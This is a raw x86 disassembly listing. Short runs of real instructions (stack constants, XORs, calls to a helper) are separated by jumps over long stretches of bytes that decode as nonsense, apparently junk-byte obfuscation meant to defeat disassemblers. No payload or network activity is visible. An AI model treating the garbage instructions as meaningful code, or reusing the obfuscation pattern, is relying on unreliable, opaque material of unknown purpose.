  418593:	mov    DWORD PTR [esp+0x34],0x5f78
  41859b:	mov    DWORD PTR [esp+0x10],0x7b9c
  4185a3:	mov    DWORD PTR [esp+0x14],0x5622
  4185ab:	mov    eax,DWORD PTR [esp+0x10]
  4185af:	mov    ecx,DWORD PTR [esp+0x14]
  4185b3:	mov    edx,DWORD PTR [esp+0x30]
  4185b7:	mov    ebx,DWORD PTR [esp+0x34]
  4185bb:	jmp    0x418818
  4185c0:	inc    edi
  4185c1:	pop    ebp
  4185c2:	sti    
  4185c3:	daa    
  4185c4:	sti    
  4185c5:	mov    ebx,0x271b9d9b
  4185ca:	mov    esp,0xddcec0a4
  4185cf:	nop
  4185d0:	fsub   st(7),st
  4185d2:	sar    BYTE PTR [esi-0x41413dcb],0x10
  4185d9:	cmp    al,0x49
  4185db:	les    edx,FWORD PTR [edi+edi*4+0x62]
  4185df:	iret   
  4185e0:	push   ss
  4185e1:	push   ds
  4185e2:	fcmovnu st,st(7)
  4185e4:	xchg   esp,eax
  4185e5:	xchg   DWORD PTR [eax-0x4ef02468],ebx
  4185eb:	popf   
  4185ec:	dec    eax
  4185ed:	fsqrt  
  4185ef:	test   al,0x77
  4185f1:	cdq    
  4185f2:	addr16 dec ecx
  4185f4:	mov    eax,ds:0xf010b8d
  4185f9:	popa   
  4185fa:	sub    al,0xc9
  4185fc:	iret   
  4185fd:	push   ebp
  4185fe:	inc    edx
  4185ff:	mov    ebx,0xac7025b4
  418604:	xor    BYTE PTR [ebp-0x33],dl
  418607:	jb     0x418603
  418609:	stc    
  41860a:	std    
  41860b:	lods   al,BYTE PTR ds:[esi]
  41860c:	xor    eax,0xc4258ca1
  418611:	fs pop ebp
  418613:	inc    edi
  418614:	dec    eax
  418615:	inc    ecx
  418616:	inc    ebx
  418617:	lods   al,BYTE PTR ds:[esi]
  418618:	aaa    
  418619:	mov    ds:0xdcbebcb2,eax
  41861e:	ds addr16 inc ecx
  418621:	pop    ds
  418622:	or     ah,cl
  418624:	mov    edi,0x10b7f3f1
  418629:	cmp    al,0x6d
  41862b:	loope  0x4185b0
  41862d:	shl    dh,0xf4
  418630:	jge    0x41869f
  418632:	call   0x1d08b32a
  418637:	repz cli 
  418639:	pop    ss
  41863a:	fldenv [edi+0x2aeec8a9]
  418640:	fcos   
  418642:	xchg   BYTE PTR [esi+0x7d],bl
  418645:	int3   
  418646:	sub    ah,al
  418648:	clc    
  418649:	adc    dh,bh
  41864b:	cmp    BYTE PTR [eax-0x18b4adfe],ch
  418651:	xchg   ecx,eax
  418652:	xchg   ebx,eax
  418653:	test   eax,0x516c9531
  418658:	mov    edi,0x8954d70
  41865d:	or     edx,DWORD PTR [eax]
  41865f:	test   BYTE PTR [ecx-0x1d],0x9c
  418663:	mov    bh,0x2d
  418665:	dec    eax
  418666:	dec    edx
  418667:	aad    0x1e
  418669:	inc    edi
  41866a:	pop    ebx
  41866b:	clc    
  41866c:	addr16 out dx,eax
  41866e:	dec    esi
  41866f:	sbb    eax,0xfa2d860e
  418674:	dec    ebp
  418675:	xchg   ecx,eax
  418676:	mov    ds:0x2b102f6b,eax
  41867b:	cmp    al,0xd3
  41867d:	pop    es
  41867e:	xchg   DWORD PTR [ebp+esi*8-0x24],ebx
  418682:	aad    0xfb
  418684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418685:	dec    ecx
  418686:	call   0x7597:0x7bec64dc
  41868d:	lods   eax,DWORD PTR ds:[esi]
  41868e:	xchg   ebx,eax
  41868f:	sti    
  418690:	adc    BYTE PTR [edx-0x867961e],ch
  418696:	sti    
  418697:	xchg   ecx,eax
  418698:	xor    bh,BYTE PTR [ebp-0x51]
  41869b:	push   ds
  41869c:	stos   BYTE PTR es:[edi],al
  41869d:	cli    
  41869e:	cld    
  41869f:	pop    edx
  4186a0:	cmp    BYTE PTR [ebp-0x58],ch
  4186a3:	iret   
  4186a4:	ins    BYTE PTR es:[edi],dx
  4186a5:	mov    cl,0xdf
  4186a7:	jmp    0x8cb63816
  4186ac:	pop    ss
  4186ad:	jo     0x418721
  4186af:	dec    ebp
  4186b0:	(bad)  
  4186b1:	aaa    
  4186b2:	dec    eax
  4186b3:	pop    edx
  4186b4:	pop    es
  4186b5:	ins    BYTE PTR es:[edi],dx
  4186b6:	sub    esi,DWORD PTR [eax+eax*1]
  4186b9:	sbb    dl,bl
  4186bb:	fild   QWORD PTR [eax]
  4186bd:	cli    
  4186be:	jb     0x41873f
  4186c0:	dec    ebp
  4186c1:	ret    
  4186c2:	inc    esp
  4186c3:	dec    edi
  4186c4:	(bad)  
  4186c5:	hlt    
  4186c6:	clc    
  4186c7:	pop    ebp
  4186c8:	mov    ds:0xab388b23,al
  4186cd:	cmp    ch,BYTE PTR [esi-0x15]
  4186d0:	cmp    BYTE PTR [edi-0x329085d7],al
  4186d6:	push   ss
  4186d7:	pop    ecx
  4186d8:	dec    edx
  4186d9:	jo     0x418741
  4186db:	mov    al,0x56
  4186dd:	rcl    BYTE PTR [ecx],1
  4186df:	mov    DWORD PTR [ecx-0x53],ecx
  4186e2:	data16 add BYTE PTR [eax],ah
  4186e5:	adc    al,0x55
  4186e7:	mov    bl,0xad
  4186e9:	mov    bl,0x74
  4186eb:	sbb    al,0x15
  4186ed:	push   edx
  4186ee:	in     al,dx
  4186ef:	inc    eax
  4186f0:	fiadd  DWORD PTR [ebp+ebp*2+0x1ef14111]
  4186f7:	dec    esi
  4186f8:	sahf   
  4186f9:	repz les ebp,FWORD PTR [edx]
  4186fc:	rol    DWORD PTR [eax+0x1ca3d71d],1
  418702:	adc    al,0xc3
  418704:	call   0x39afb657
  418709:	xor    edi,ebx
  41870b:	into   
  41870c:	sub    bl,al
  41870e:	leave  
  41870f:	repnz lock int3 
  418712:	out    0xf,al
  418714:	pop    esi
  418715:	pop    edx
  418716:	call   0xe6a3d977
  41871b:	cwde   
  41871c:	test   BYTE PTR [ecx-0x4b281a39],cl
  418722:	or     eax,0xfc39ce7c
  418727:	push   esp
  418728:	push   ds
  418729:	mov    WORD PTR [ecx],ds
  41872b:	out    0x76,al
  41872d:	mov    BYTE PTR [ecx],bh
  41872f:	adc    dh,BYTE PTR ds:0x9581bc59
  418735:	jno    0x418746
  418737:	mov    eax,DWORD PTR [ebx]
  418739:	pop    esi
  41873a:	sahf   
  41873b:	xchg   DWORD PTR [edi],esp
  41873d:	jp     0x41879e
  41873f:	xchg   ebp,eax
  418740:	in     al,dx
  418741:	mov    edi,0xea1f797d
  418746:	idiv   edx
  418748:	sbb    eax,0x906ef434
  41874d:	jnp    0x41876a
  41874f:	pop    esi
  418750:	add    cl,cl
  418752:	popa   
  418753:	jae    0x418742
  418755:	push   es
  418756:	adc    BYTE PTR [esi],0xad
  418759:	push   ecx
  41875a:	call   0x2fe9:0x96ddc94a
  418761:	adc    cl,BYTE PTR [eax-0x10]
  418764:	mov    DWORD PTR [esi+0xc],ebp
  418767:	mov    eax,ds:0xfcd8d4d
  41876c:	aas    
  41876d:	push   es
  41876e:	add    eax,0x8c614edc
  418773:	lock adc esi,DWORD PTR [edx]
  418776:	cdq    
  418777:	mul    BYTE PTR ds:0xae1e2a28
  41877d:	daa    
  41877e:	cmp    al,0x74
  418780:	mov    eax,DWORD PTR [esi]
  418782:	pop    edi
  418783:	jbe    0x4187ad
  418785:	mov    edx,0x7a3a1987
  41878a:	cmp    ebp,ebp
  41878c:	sbb    eax,0x26ca0cad
  418791:	cmp    edx,DWORD PTR [edx-0xa]
  418794:	jge    0x4187b7
  418796:	cdq    
  418797:	xchg   edx,eax
  418798:	lds    ebx,FWORD PTR [edx-0x29081e28]
  41879e:	les    ebp,FWORD PTR [ebx]
  4187a0:	inc    ecx
  4187a1:	mov    esp,0xe674391f
  4187a6:	mov    ebp,cs
  4187a8:	or     al,0x54
  4187aa:	and    edx,DWORD PTR [edx-0x80]
  4187ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187ae:	pop    ebx
  4187af:	shl    DWORD PTR [edx+0x6e],0x4b
  4187b3:	pop    ss
  4187b4:	into   
  4187b5:	push   ebx
  4187b6:	mov    bh,0x97
  4187b8:	pop    es
  4187b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ba:	out    dx,al
  4187bb:	add    BYTE PTR [ecx],bh
  4187bd:	inc    esi
  4187be:	xor    BYTE PTR [edi-0x159cfb81],dl
  4187c4:	mov    ch,0xc0
  4187c6:	cli    
  4187c7:	lds    ecx,FWORD PTR ds:0xe4203cb8
  4187cd:	(bad)  
  4187cf:	(bad)  
  4187d0:	adc    BYTE PTR [ecx+0x6c98a529],ch
  4187d6:	push   ss
  4187d7:	pop    ebx
  4187d8:	into   
  4187d9:	cld    
  4187da:	jbe    0x4187a4
  4187dc:	stos   BYTE PTR es:[edi],al
  4187dd:	outs   dx,BYTE PTR ds:[esi]
  4187de:	dec    ebp
  4187df:	add    DWORD PTR [eax+ebx*2],edi
  4187e2:	fnstcw WORD PTR ds:0xac33a4dd
  4187e8:	ret    
  4187e9:	pop    esi
  4187ea:	in     al,0x92
  4187ec:	outs   dx,DWORD PTR ds:[esi]
  4187ed:	mov    ds:0xeda78582,al
  4187f2:	cmp    BYTE PTR [ecx-0x5c2159ac],ah
  4187f8:	jae    0x4187bb
  4187fa:	push   0xffffff89
  4187fc:	je     0x4187e8
  4187fe:	out    dx,eax
  4187ff:	int3   
  418800:	shl    BYTE PTR [ecx*2+0x56570ca9],cl
  418807:	xor    DWORD PTR [edx],esi
  418809:	mov    bl,0x26
  41880b:	pop    edx
  41880c:	cs sub ebp,edi
  41880f:	hlt    
  418810:	fcmovnbe st,st(3)
  418812:	leave  
  418813:	jb     0x4187c9
  418815:	shl    BYTE PTR [edx-0x65],cl
  418818:	add    eax,0x3646
  41881d:	adc    ecx,0x7ace
  418823:	xor    eax,0x3e2e
  418828:	xor    ecx,0x4b71
  41882e:	and    eax,edx
  418830:	mov    DWORD PTR [esp+0x88],eax
  418837:	and    ecx,ebx
  418839:	mov    DWORD PTR [esp+0x8c],ecx
  418840:	mov    DWORD PTR [esp+0x50],0x18d6
  418848:	mov    DWORD PTR [esp+0x54],0x2bb4
  418850:	mov    DWORD PTR [esp+0x48],0x14
  418858:	mov    DWORD PTR [esp+0x4c],0x0
  418860:	mov    DWORD PTR [esp+0x30],0x1
  418868:	mov    DWORD PTR [esp+0x34],0x0
  418870:	mov    DWORD PTR [esp+0x10],0xa87
  418878:	mov    DWORD PTR [esp+0x14],0x7fd9
  418880:	jmp    0x418add
  418885:	mov    dh,0xe5
  418887:	jmp    0x836c:0xb814b913
  41888e:	adc    DWORD PTR [esi+0x4ce7e790],ebx
  418894:	xchg   edx,eax
  418895:	push   ebx
  418896:	repz sar BYTE PTR [esi-0x41413dcb],0xb0
  41889e:	push   eax
  41889f:	in     eax,dx
  4188a0:	(bad)  
  4188a2:	(bad)  
  4188a3:	cld    
  4188a4:	dec    esp
  4188a5:	popa   
  4188a6:	test   BYTE PTR ds:0x4bf4988b,bl
  4188ac:	rcr    BYTE PTR [ebp+0x3a],0xd6
  4188b0:	ret    
  4188b1:	ret    
  4188b2:	cwde   
  4188b3:	mov    edi,0x19f11e34
  4188b8:	adc    esp,DWORD PTR [eax]
  4188ba:	ja     0x4188c7
  4188bc:	mov    eax,0x47e626ad
  4188c1:	mov    bl,0x97
  4188c3:	call   0xe89fb66a
  4188c8:	mov    ah,0x71
  4188ca:	mov    BYTE PTR [ebx-0x25a76ca8],0xd2
  4188d1:	loope  0x418930
  4188d3:	mov    ds:0xdf6d24e,eax
  4188d8:	cmp    BYTE PTR fs:[eax-0x3e],bl
  4188dc:	mov    eax,0xd51f00a
  4188e1:	add    BYTE PTR [esi+ebx*2],0x59
  4188e5:	xchg   esi,eax
  4188e6:	out    dx,al
  4188e7:	mov    al,0xe
  4188e9:	bndstx [esi],(bad)
  4188ec:	ins    BYTE PTR es:[edi],dx
  4188ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188ee:	jno    0x418963
  4188f0:	jno    0x418961
  4188f2:	daa    
  4188f3:	aaa    
  4188f4:	in     al,dx
  4188f5:	xchg   DWORD PTR [ecx+0x4b25cd7f],ebp
  4188fb:	leave  
  4188fc:	pop    ss
  4188fd:	pop    eax
  4188fe:	test   eax,0xab04fe57
  418903:	sub    al,0x3b
  418905:	dec    ebx
  418906:	inc    esi
  418907:	push   ecx
  418908:	rcr    DWORD PTR [edi+0x3889b784],cl
  41890e:	mov    ds:0xf075e6f9,eax
  418913:	sub    al,0xd7
  418915:	aam    0xfd
  418917:	xor    ebx,esi
  418919:	xor    ah,BYTE PTR [ecx-0x6f]
  41891c:	imul   ebx,DWORD PTR [eax+0x1c],0x938ceacf
  418923:	cmp    esi,edx
  418925:	add    esi,ecx
  418927:	fcomp  DWORD PTR [ebp-0x6691a9e1]
  41892d:	retf   
  41892e:	out    dx,eax
  41892f:	mov    edx,DWORD PTR [ecx+0x592d102b]
  418935:	mov    al,0x14
  418937:	pop    ds
  418938:	sti    
  418939:	mov    ebp,0x1703cd30
  41893e:	leave  
  41893f:	adc    ebp,esi
  418941:	lods   al,BYTE PTR ds:[esi]
  418942:	mov    al,BYTE PTR [ebx-0x79]
  418945:	int3   
  418946:	call   0x3e27c30f
  41894b:	xor    eax,0xd01d1a17
  418950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418951:	dec    esi
  418952:	push   esi
  418953:	stos   BYTE PTR es:[edi],al
  418954:	test   bl,ch
  418956:	pop    ss
  418957:	xor    DWORD PTR [ecx+0x162cc812],0x7a
  41895e:	xchg   esp,eax
  41895f:	retf   
  418960:	lock jecxz 0x41899c
  418963:	jg     0x4189bd
  418965:	nop
  418966:	xchg   edi,eax
  418967:	adc    DWORD PTR [edx+edx*1-0x59],eax
  41896b:	or     al,BYTE PTR [ebx-0x67b7a623]
  418971:	add    BYTE PTR [eax-0x15],ch
  418974:	push   ecx
  418975:	(bad)  
  418977:	fwait
  418978:	or     al,0xd1
  41897a:	fcom   DWORD PTR [eax+ebx*4]
  41897d:	test   BYTE PTR [ebp+0x36],0x69
  418981:	arpl   WORD PTR [ebp+0x67],sp
  418984:	jg     0x41890a
  418986:	mov    al,0x39
  418988:	rcl    DWORD PTR [eax-0x5a],0x69
  41898c:	mov    esi,0xe32dbb9f
  418991:	retf   0x1271
  418994:	in     al,0xcd
  418996:	xchg   esi,eax
  418997:	sahf   
  418998:	repnz mov eax,ds:0x2b89c35f
  41899e:	mov    ds:0xab97aa23,al
  4189a3:	or     edi,ebx
  4189a5:	lock js 0x418965
  4189a8:	std    
  4189a9:	stos   BYTE PTR es:[edi],al
  4189aa:	aas    
  4189ab:	dec    ecx
  4189ac:	pop    ds
  4189ad:	xchg   ebx,eax
  4189ae:	loope  0x418a2d
  4189b0:	xor    eax,0xdfdf08a2
  4189b5:	xor    eax,0xb4a992c8
  4189ba:	and    DWORD PTR [eax],edi
  4189bc:	mov    edx,0x833fc755
  4189c1:	in     eax,dx
  4189c2:	xchg   ecx,eax
  4189c3:	xchg   edx,eax
  4189c4:	mov    cl,0xf6
  4189c6:	jmp    0xc804:0xefe15112
  4189cd:	in     al,dx
  4189ce:	inc    ebx
  4189cf:	and    ah,BYTE PTR [edi]
  4189d1:	inc    eax
  4189d2:	ins    BYTE PTR es:[edi],dx
  4189d3:	sbb    edi,ecx
  4189d5:	xlat   BYTE PTR ds:[ebx]
  4189d6:	jns    0x418a1e
  4189d8:	mov    eax,0xb7c07494
  4189dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189de:	push   ebp
  4189df:	sub    edi,esi
  4189e1:	cmp    dh,ah
  4189e3:	mov    edi,0x58cf374c
  4189e8:	mov    ebx,DWORD PTR [edx+0x435d17b0]
  4189ee:	jns    0x418a0c
  4189f0:	mov    edx,0x158ca0c4
  4189f5:	es std 
  4189f7:	outs   dx,BYTE PTR ds:[esi]
  4189f8:	mov    ebx,esi
  4189fa:	fwait
  4189fb:	xlat   BYTE PTR ds:[ebx]
  4189fc:	shl    BYTE PTR [edx+edi*1-0xa],0x5a
  418a01:	scas   eax,DWORD PTR es:[edi]
  418a02:	cs dec eax
  418a04:	dec    ebp
  418a05:	fst    DWORD PTR [eax]
  418a07:	ret    
  418a08:	cld    
  418a09:	gs dec esi
  418a0b:	pop    ebp
  418a0c:	fist   DWORD PTR [esp+ecx*1+0x63287890]
  418a13:	dec    ebp
  418a14:	iret   
  418a15:	pop    edi
  418a16:	(bad)  
  418a17:	jmp    DWORD PTR [eax-0x69254a0a]
  418a1d:	adc    bl,BYTE PTR [edx+esi*2]
  418a20:	adc    eax,0xa1375b4d
  418a25:	jnp    0x4189e8
  418a27:	pop    ss
  418a28:	pop    ds
  418a29:	xor    DWORD PTR [edi],ebp
  418a2b:	fnstcw WORD PTR [eax*8-0x73f6f547]
  418a32:	pop    ds
  418a33:	out    dx,al
  418a34:	les    edx,FWORD PTR [edx-0x33d57911]
  418a3a:	mov    edx,0x983e0738
  418a3f:	push   cs
  418a40:	dec    esi
  418a41:	fidivr DWORD PTR [edi]
  418a43:	sub    eax,0xf9b88114
  418a48:	cdq    
  418a49:	das    
  418a4a:	call   FWORD PTR [edx+ebp*8]
  418a4d:	mov    ds:0x8a2b9c73,al
  418a52:	(bad)  
  418a54:	test   BYTE PTR [ecx-0x30],dl
  418a57:	into   
  418a58:	push   ebx
  418a59:	call   0x403a2067
  418a5e:	nop
  418a5f:	int3   
  418a60:	add    al,0xcf
  418a62:	sbb    esp,DWORD PTR [eax+0x4a]
  418a65:	sbb    al,0x8f
  418a67:	or     al,0x70
  418a69:	and    BYTE PTR [edx],cl
  418a6b:	lods   al,BYTE PTR ds:[esi]
  418a6c:	mov    ds:0x1dcdf322,eax
  418a71:	lods   al,BYTE PTR ds:[esi]
  418a72:	cs (bad) 
  418a74:	out    dx,eax
  418a75:	pop    esp
  418a76:	fild   QWORD PTR [ebp+0x32dc314d]
  418a7c:	lea    ebx,[ebp+0x79176da9]
  418a82:	cmp    DWORD PTR ds:0x6ba2d644,edx
  418a88:	pop    ecx
  418a89:	jmp    0xf8571b34
  418a8e:	pcmpeqd mm5,QWORD PTR [esi+eiz*2+0x2e]
  418a93:	sbb    esi,edi
  418a95:	push   ss
  418a96:	ficom  WORD PTR [esp+eiz*2+0x30]
  418a9a:	ins    DWORD PTR es:[edi],dx
  418a9b:	or     eax,ebx
  418a9d:	push   esi
  418a9e:	in     eax,dx
  418a9f:	jle    0x418af4
  418aa1:	icebp  
  418aa2:	sahf   
  418aa3:	push   eax
  418aa4:	aad    0x74
  418aa6:	inc    ebp
  418aa7:	mov    esi,0x3e910b96
  418aac:	add    al,0xb5
  418aae:	mov    ecx,0xfba5ddf0
  418ab3:	into   
  418ab4:	outs   dx,BYTE PTR ds:[esi]
  418ab5:	sar    BYTE PTR [eax+esi*8-0x1976af38],cl
  418abc:	mov    al,ds:0x96eede52
  418ac1:	sti    
  418ac2:	push   ebp
  418ac3:	push   ecx
  418ac4:	inc    esi
  418ac5:	shl    BYTE PTR [ecx],1
  418ac7:	push   ebx
  418ac8:	not    DWORD PTR [ecx]
  418aca:	mov    ch,0x15
  418acc:	mov    ds:0xa48cffd,al
  418ad1:	dec    esi
  418ad2:	push   ds
  418ad3:	ret    0x8ae1
  418ad6:	push   esp
  418ad7:	or     ebp,DWORD PTR [esi+0x2]
  418ada:	adc    ebx,esi
  418adc:	push   edx
  418add:	mov    eax,DWORD PTR [esp+0x10]
  418ae1:	mov    ecx,DWORD PTR [esp+0x14]
  418ae5:	push   0x2
  418ae7:	push   0x7f349462
  418aec:	xor    ecx,0x3601
  418af2:	xor    eax,0x5491
  418af7:	push   ecx
  418af8:	push   eax
  418af9:	call   0x422220
  418afe:	mov    ecx,DWORD PTR [esp+0x30]
  418b02:	mov    ebx,DWORD PTR [esp+0x34]
  418b06:	push   ebx
  418b07:	push   ecx
  418b08:	push   edx
  418b09:	push   eax
  418b0a:	call   0x422220
  418b0f:	mov    ecx,DWORD PTR [esp+0x48]
  418b13:	mov    ebx,DWORD PTR [esp+0x4c]
  418b17:	jmp    0x418d74
  418b1c:	jp     0x418ac4
  418b1e:	cld    
  418b1f:	dec    eax
  418b20:	cmp    al,0x9c
  418b22:	jp     0x418ae0
  418b24:	js     0x418b9b
  418b26:	push   esp
  418b27:	sahf   
  418b28:	cmp    DWORD PTR [ebp+0x46],edi
  418b2b:	xchg   edx,eax
  418b2c:	retf   
  418b2d:	test   eax,0xbec235be
  418b33:	mov    esi,0xdaecfb67
  418b38:	adc    eax,0x8e5b71ba
  418b3d:	sub    al,BYTE PTR [edx+0x2a]
  418b40:	sub    eax,0xa5b12500
  418b45:	arpl   sp,sp
  418b47:	shr    esi,cl
  418b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b4a:	sub    BYTE PTR [ebp+eiz*4+0x4b148b1a],ah
  418b51:	cmp    BYTE PTR ds:0x403979c1,0xa5
  418b58:	jnp    0x418ba2
  418b5a:	test   eax,esi
  418b5c:	jb     0x418b21
  418b5e:	jge    0x418b8e
  418b60:	mov    al,ds:0x7875ef8f
  418b65:	outs   dx,BYTE PTR ds:[esi]
  418b66:	push   cs
  418b67:	mov    cl,0xf8
  418b69:	xlat   BYTE PTR fs:[ebx]
  418b6b:	dec    esp
  418b6c:	push   cs
  418b6d:	call   0x815882cc
  418b72:	sub    edx,eax
  418b74:	xor    bl,BYTE PTR [edi-0x7f]
  418b77:	push   ebp
  418b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b79:	popa   
  418b7a:	pop    ecx
  418b7b:	xchg   ebp,eax
  418b7c:	mov    cl,0x42
  418b7e:	or     DWORD PTR [ebp+eax*1+0x2c4838cb],ebp
  418b85:	mov    ah,0x31
  418b87:	add    DWORD PTR [edi-0x3f],0xe18be523
  418b8e:	sub    al,0xc2
  418b90:	adc    ecx,DWORD PTR [edx]
  418b92:	xor    DWORD PTR [ecx],0xffffffec
  418b95:	(bad)  
  418b96:	cmp    eax,0x4a5a062b
  418b9b:	outs   dx,BYTE PTR ds:[esi]
  418b9c:	or     BYTE PTR [edi-0x80],0xd7
  418ba0:	inc    ecx
  418ba1:	adc    BYTE PTR [eax+edi*4-0x34],0xe6
  418ba6:	fimul  DWORD PTR [edx+0x3d19ba76]
  418bac:	push   edx
  418bad:	repz jecxz 0x418b52
  418bb0:	(bad)  
  418bb1:	pop    esp
  418bb2:	iret   
  418bb3:	mov    al,0x34
  418bb5:	loopne 0x418b9c
  418bb7:	mov    esp,0xc11423c4
  418bbc:	jno    0x418bef
  418bbe:	jmp    0x418c22
  418bc0:	add    BYTE PTR [edi-0x70],ch
  418bc3:	xchg   esp,eax
  418bc4:	cmp    dh,dh
  418bc6:	test   eax,ebx
  418bc8:	dec    ebp
  418bc9:	sbb    DWORD PTR [edi],esp
  418bcb:	ins    DWORD PTR es:[edi],dx
  418bcc:	nop
  418bcd:	push   cs
  418bce:	js     0x418c25
  418bd0:	pop    es
  418bd1:	cmp    ebx,ecx
  418bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bd4:	bound  edx,QWORD PTR [ecx+0x1e]
  418bd7:	pop    esi
  418bd8:	jnp    0x418c20
  418bda:	shr    DWORD PTR [ebp+0xfc01808],1
  418be0:	mov    al,0xf6
  418be2:	ficomp DWORD PTR [edi]
  418be4:	mov    cl,0xe3
  418be6:	dec    edi
  418be7:	jnp    0x418be2
  418be9:	cmp    eax,DWORD PTR [esi]
  418beb:	loop   0x418c51
  418bed:	out    0x5,eax
  418bef:	cs dec esp
  418bf1:	jg     0x418c61
  418bf3:	pop    ds
  418bf4:	lods   eax,DWORD PTR ds:[esi]
  418bf5:	aad    0x50
  418bf7:	(bad)  
  418bf8:	and    ebp,esi
  418bfa:	dec    edi
  418bfb:	cmc    
  418bfc:	js     0x418c2b
  418bfe:	popa   
  418bff:	imul   edx,DWORD PTR [eax+0x66e2cc44],0x44f91062
  418c09:	or     BYTE PTR [edx-0x14],bl
  418c0c:	stos   DWORD PTR es:[edi],eax
  418c0d:	jae    0x418bb9
  418c0f:	mov    ah,0x60
  418c11:	mov    ah,0x83
  418c13:	and    edi,DWORD PTR ds:0x6a6f8f3b
  418c19:	mov    ah,BYTE PTR [ebx+0x6c]
  418c1c:	push   esp
  418c1d:	je     0x418baa
  418c1f:	scas   al,BYTE PTR es:[edi]
  418c20:	xchg   ebx,eax
  418c21:	mov    ebx,0xfcdcee7c
  418c26:	jnp    0x418c9e
  418c28:	lahf   
  418c29:	(bad)  
  418c2a:	sbb    eax,0x3d15e2e0
  418c2f:	ret    
  418c30:	cmp    DWORD PTR [ebp+0x7c],0x789ba352
  418c37:	mov    ds:0xc5a3cb18,eax
  418c3c:	sub    eax,DWORD PTR [esi+0x16915d2a]
  418c42:	lods   eax,DWORD PTR ds:[esi]
  418c43:	cmp    BYTE PTR [edx+ebp*1],al
  418c46:	ret    0xe565
  418c49:	mov    esi,0x105cb820
  418c4e:	lock aaa 
  418c50:	pop    ds
  418c51:	push   eax
  418c52:	adc    eax,0xfa73e3cb
  418c57:	test   BYTE PTR [esi],0x2b
  418c5a:	stc    
  418c5b:	imul   esi,DWORD PTR ds:0x42ce34d7,0xffffffd7
  418c62:	jle    0x418c95
  418c64:	lgs    ecx,FWORD PTR [edx]
  418c67:	in     eax,0x4f
  418c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c6a:	loope  0x418c16
  418c6c:	dec    esi
  418c6d:	push   eax
  418c6e:	daa    
  418c6f:	pop    ebx
  418c70:	cdq    
  418c71:	pop    edi
  418c72:	xor    eax,0xde8b794b
  418c77:	jno    0x418c5c
  418c79:	cdq    
  418c7a:	push   edx
  418c7b:	mov    ds:0x8f78f3f7,eax
  418c80:	lods   eax,DWORD PTR ds:[esi]
  418c81:	push   ecx
  418c82:	jle    0x418c9f
  418c84:	(bad)
  418c87:	sahf   
  418c88:	inc    esp
  418c89:	jle    0x418ce0
  418c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c8c:	(bad)  
  418c8d:	sub    BYTE PTR [ecx-0x39c5d25f],0x3c
  418c94:	mov    eax,0xc54c7e5f
  418c99:	into   
  418c9a:	(bad)  
  418c9b:	shl    BYTE PTR [eax],cl
  418c9d:	pop    esp
  418c9e:	mov    dh,0xa
  418ca0:	and    eax,0xe0794a2a
  418ca5:	sub    bl,BYTE PTR [esi]
  418ca7:	outs   dx,BYTE PTR ds:[esi]
  418ca8:	(bad)  
  418caa:	std    
  418cab:	adc    al,BYTE PTR [eax+0x15070bda]
  418cb1:	xchg   ebx,eax
  418cb2:	mov    cl,0x39
  418cb4:	jns    0x418c99
  418cb6:	fs jp  0x418d2b
  418cb9:	add    ebp,edx
  418cbb:	inc    edi
  418cbc:	enter  0x397d,0x8
  418cc0:	out    dx,eax
  418cc1:	stos   BYTE PTR es:[edi],al
  418cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cc3:	mov    cl,BYTE PTR [ebp+0x1f]
  418cc6:	sbb    eax,0xbfb7caa9
  418ccb:	(bad)  
  418ccc:	jg     0x418cfa
  418cce:	test   eax,0x7c9672a6
  418cd3:	pop    edi
  418cd4:	mov    eax,0x119196ac
  418cd9:	test   al,0x9d
  418cdb:	repz jbe 0x418d06
  418cde:	ja     0x418d27
  418ce0:	in     eax,dx
  418ce1:	inc    esp
  418ce2:	rol    DWORD PTR [edi],0x6d
  418ce5:	loope  0x418c68
  418ce7:	mov    ch,0x23
  418ce9:	mov    WORD PTR [ebx+eax*1-0x3759f3ca],?
  418cf0:	jnp    0x418cdc
  418cf2:	add    BYTE PTR [ebx],ah
  418cf4:	loopne 0x418cb0
  418cf6:	dec    edx
  418cf7:	lods   al,BYTE PTR ds:[esi]
  418cf8:	add    eax,0x2bfadc13
  418cfd:	mov    bl,0xbf
  418cff:	lock xchg ecx,eax
  418d01:	adc    al,0x7c
  418d03:	inc    BYTE PTR [esi+0x4cc1ab84]
  418d09:	sub    DWORD PTR [edx-0x645c0fd9],eax
  418d0f:	add    BYTE PTR [eax+0x74],dh
  418d12:	mov    dl,0xe9
  418d14:	mov    cl,0x7b
  418d16:	cmp    al,0x4b
  418d18:	daa    
  418d19:	cld    
  418d1a:	mov    bl,0x4d
  418d1c:	je     0x418d47
  418d1e:	mov    ecx,0xc209d553
  418d23:	es jno 0x418cdb
  418d26:	ficomp DWORD PTR [edx+0x15]
  418d29:	std    
  418d2a:	xor    esi,edx
  418d2c:	dec    ebx
  418d2d:	mov    eax,0x696683bb
  418d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d33:	xchg   edi,eax
  418d34:	inc    edi
  418d35:	dec    esp
  418d36:	jmp    0x9f62e323
  418d3b:	pop    eax
  418d3c:	add    BYTE PTR [edx+edi*2+0x8c882ee],bh
  418d43:	cld    
  418d44:	out    dx,eax
  418d45:	mov    ebp,0x3697f648
  418d4a:	jmp    0x73cb9f9
  418d4f:	and    DWORD PTR ds:0x9f625363,ecx
  418d55:	cld    
  418d56:	add    eax,0xd2ce0683
  418d5b:	rcr    BYTE PTR [ebx],1
  418d5d:	sub    eax,0x90e6eb3
  418d62:	ja     0x418d97
  418d64:	scas   al,BYTE PTR es:[edi]
  418d65:	in     eax,0xff
  418d67:	gs mov ?,esp
  418d6a:	inc    ebp
  418d6b:	lods   al,BYTE PTR ds:[esi]
  418d6c:	xchg   edx,eax
  418d6d:	jg     0x418d45
  418d6f:	js     0x418d49
  418d71:	outs   dx,BYTE PTR ds:[esi]
  418d72:	inc    ebp
  418d73:	sub    al,0x53
  418d75:	push   ecx
  418d76:	push   edx
